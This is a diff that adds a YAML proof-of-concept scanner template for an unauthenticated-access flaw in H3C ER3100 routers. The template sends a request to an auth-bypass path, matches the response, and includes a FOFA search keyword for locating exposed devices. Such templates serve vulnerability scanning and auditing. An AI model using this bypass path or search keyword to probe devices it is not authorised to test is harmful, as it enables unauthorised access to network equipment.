@@ -1,0 +1,19 @@
+name: poc-yaml-h3c-er3100-unauth-access
+manual: true
+transport: http
+rules:
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /home.asp?userLogin.asp
+        expression: response.status == 200 && response.body.bcontains(b"user_expire_time=") && response.body.bcontains(b"maintain_basic.asp") && "Server" in response.headers && response.headers["Server"].contains("H3C-Miniware-Webs")
+expression: r1()
+detail:
+    author: cysec
+    links:
+        - http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0132500
+    vulnerability:
+        id: CT-483399
+        level: low
+    fofakeyword: ER3100系统管理
